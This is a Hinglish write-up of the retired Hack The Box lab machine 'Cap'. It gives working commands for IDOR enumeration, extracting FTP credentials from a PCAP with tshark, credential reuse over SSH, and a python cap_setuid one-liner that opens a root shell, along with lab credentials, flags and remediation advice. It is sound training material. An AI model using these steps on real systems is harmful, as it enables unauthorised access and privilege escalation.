# Cap — Writeup

| Field | Value |
|-------|-------|
| **Machine** | Cap |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Released** | 2021-06-05 (retired) |
| **IP** | 10.129.51.175 (VPN `tun0`) |
| **Owned** | 2026-09-27 — User ✅ Root ✅ |
| **Time** | ~5 minutes |

**Attack path (TL;DR):**

```text
nmap → Gunicorn "Security Dashboard" on :80
     → IDOR: /data/N leaks other users' data
     → /download/0 serves a PCAP capture
     → tshark pulls FTP creds from PCAP
     → FTP login → user.txt → SSH → same password
     → python3.8 has cap_setuid → root shell → root.txt
```

---

## 1. The Thought Process (dimaag kaise chala)

Nmap ne **3 ports** diye:

| Port | Service | Mera soch |
|------|---------|-----------|
| 21 | vsftpd (FTP) | Anonymous check hoga, par bina creds ke andar sirf tab jab anonymous ON ho |
| 22 | OpenSSH | Brute-force = time-waste (password milne tak hours) |
| 80 | Gunicorn "Security Dashboard" | **Sabse zyada chances** — web apps mein human logical errors (IDOR, SQLi, auth bypass) milte hain |

**Order of attack:** Web pehle — kyunki wahan se creds milne ke baad
FTP/SSH dono auto-open ho jaate hain. Ulta karo toh brute-force mein
ghante lag jaate.

Web page khola → login-gated dashboard dikha with tabs like
*Security Transfers*, *PCAP Storage*. URL mein `?id=1` jaisa kuch dikha
→ turant **IDOR ka shak** (ghuman idea: agar server `id` maang raha hai
aur check nahi raha ki *mera* hai — wahi toh IDOR hai).

PCAP file dikhi → **captures = traffic recording = passwords in
cleartext** (FTP data ekdum plain jaata hai). Isliye next move tshark.

## 2. Recon

```bash
nmap -sC -sV -oA recon 10.129.51.175
```

```text
-sC  : default scripts chalao (banner grab, OS guess — manually guess mat karo)
-sV  : service versions detect (version nahi toh CVE search nahi)
-oA  : output ko recon.* naam ki teen files mein save (txt + nmap + gnmap)
```

```
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open  http    gunicorn (Security Dashboard)
```

## 3. Dead Ends (kya try kiya, kya fail hua)

> Yeh box smooth tha, par privesc mein pehle standard checks khaali nikle —
> yahi sequence agli baar speed deta hai:

1. **`sudo -l`** → user ke paas sudo entries nahi thi.
2. **SUID check** (`find / -perm -4000`) → sirf standard binaries
   (`su`, `sudo`, `passwd`...) — kuch unusual nahi.
3. **Writable /etc/passwd / crontab** → nahi mile.
4. Tab jaakar **Linux Capabilities** check ki (`getcap -r /`) → **HIT!**

> Yaad rakho: capabilities = SUID ka modern chhota bhai. Zyadatar
> beginners SUID tak ruk jaate hain aur cap wala vector miss kar jaate.

## 4. Vulnerability ELI5

**IDOR (Insecure Direct Object Reference):**

> Maan lo hotel mein room 101 ki tumhare paas key hai. Tumne room 102
> ki key bhi aazmaayi — aur khul gaya! Kyunki guard (server) check hi
> nahi raha ki key kiski hai. Yahan `/data/1` meri thi, `/data/0`
> badalte hi server ne bina puchhe dusre user ka data de diya.

**Linux Capability (`cap_setuid`):**

> SUID = poori car ki chaabi de dena (program poori root power le leta hai).
> Capability = sirf AC chalane ki permission deni. **Par yahan Python ko
> `cap_setuid` diya tha** = steering control de diya — jiske paas python
> hai wo seedha "gaadi" (root shell) hijack kar leta hai.

## 5. Exploitation

### Web → IDOR → PCAP

```bash
curl -s http://10.129.51.175/ | head -50
```

```text
-s : silent mode (progress bar hata — scripts mein output saaf rahe)
```

URLs mile: `/data/1` (security tasks), `/download/0` (files).
IDs enumerate:

```bash
for i in $(seq 1 20); do
  echo "--- /data/$i ---"
  curl -s "http://10.129.51.175/data/$i"
done
```

`/download/0` se PCAP mila:

```bash
curl -s -o cap.pcap "http://10.129.51.175/download/0"
```

```text
-o cap.pcap : response ko file mein save (screen pe binary kachra na aaye)
```

### PCAP → credentials

```bash
tshark -r cap.pcap -Y ftp.request.arg -T fields -e ftp.request.arg
```

```text
-r cap.pcap     : capture file padho
-Y filter       : Wireshark jaisa display filter — sirf FTP arguments dikhao
-T fields -e .. : packet ka baaki kachra hatao, sirf actual value print karo
```

```
USER nathan
PASS Buck3tH4TF0RM3!
```

### Foothold

```bash
ftp 10.129.51.175        # USER nathan / PASS Buck3tH4TF0RM3!
cat user.txt             # FTP se hi flag mil gaya

ssh nathan@10.129.51.175 # same password — SSH (shell behtar hai)
```

### Privesc: capabilities

```bash
getcap -r / 2>/dev/null
```

```text
getcap -r / : poore filesystem mein file capabilities dhoondho
2>/dev/null : permission-denied errors screen pe na aayein
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

**Why it worked:** `cap_setuid` ka matlab is Python binary ko
`setuid(0)` call karne ki permission hai — Python SUID nahi hai, phir
bhi wo khud ko root bana sakta hai:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```text
-c      : Python ko command string do (file banane ki zaroorat nahi)
os.setuid(0) : uid 0 = root ban jao
os.system    : shell chalao
```

## 6. Flags

```text
user: ed6aad7b3836bffc740aa31e38ff6ac1
root: 323fb183effc32e42224ebff69f9effd
```

```bash
htb machine own <flag>
```

## 7. Patch / Remediation

- **IDOR fix:** har `/data/<id>` request pe session se check karo ki
  record *uske* user ka hai — `if record.user_id != session.user_id: 403`.
  Object ID guessable rakho hi mat (UUIDs bhi sirf *layer* hai, check
  compulsory hai).
- **FTP ban:** plaintext FTP ki jagah **SFTP/SSH** — passwords aur data
  dono encrypt. Agar FTP zaroori ho toh at least **FTPS (TLS)**.
- **Capture files:** PCAP ko public webroot se hatao — authenticated
  download + authorization.
- **Capability hatao:** `setcap -r /usr/bin/python3.8` — Python ko
  setuid capability kabhi deni hi nahi chahiye (scripting language +
  root power = disaster). Neeche-level jail/venv use karo.

## Key takeaways

1. **IDOR hunting sasta hai** — URLs mein numeric IDs (`/data/1`)
   chhedo, bina kisi exploit code ke.
2. **PCAP gift box hai** — `tshark -Y` se5 minute ka clicking ek
   command ban jaata hai.
3. **`getcap -r /` har privesc checklist mein** — `sudo -l` aur
   SUID ke saath.
4. **Creds reuse** — FTP wala password SSH pe bhi chal gaya.
5. **Failures bhi data hain** — sudo/SUID khaali nikle, tab capability
   tak pahunche. Agle box mein wahi checklist5 minute bachayegi.

## Final Checklist

- [x] Naya banda flags samajh payega? (har flag ka 2-line explainer)
- [x] Pehla kadam kyun — bataya? (web > ftp/ssh ki reasoning)
- [x] Commands ka order = actual terminal order? ✓

## Tools used

`nmap` · `curl` · `tshark` · `ftp`/`ssh` · `getcap` · `htb` CLI
